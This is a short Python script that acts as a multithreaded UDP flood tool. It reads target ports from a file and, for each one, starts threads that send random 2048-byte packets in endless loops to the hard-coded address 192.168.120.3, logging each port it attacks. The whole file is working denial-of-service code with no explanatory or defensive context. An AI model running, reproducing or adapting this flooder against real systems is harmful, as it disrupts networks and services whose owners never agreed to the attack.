import subprocess
import threading
import time
import socket
import random

bytes = random._urandom(2048)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sent = 0

def DDos(ip, port):
    global sent, bytes
    while True:
        a = sock.sendto(bytes, (ip, port))

def attack(ip, port):
    print(f"Attacking port --> {port}")
    write_to_file(port)
    for i in range(5):
        threading.Thread(target=DDos, args=[ip, int(port)]).start()

def clear_file():
    with open("./res.txt", "w") as f:
        f.write("")

#write to file
def write_to_file(port):
    with open("./res.txt", "a") as f:
        f.write(f"Attacking port--> {port}\n")

# read list from file
def read_from_file():
    l = []
    with open("./port_list.txt", "r") as f:
        a = f.read()
    print (a.replace("[", "").replace("]", "").split(", "))
    return a.replace("[", "").replace("]", "").split(", ")

def attack_network():
    clear_file()
    ip = '192.168.120.3'
    print(f'attacking ip: {ip}')
    ports = read_from_file()
    threads = []
    for port in ports:
        th = threading.Thread(target=attack, args=[ip, port])
        threads.append(th)
        th.start()
        
    for th in threads:
        th.join()

attack_network()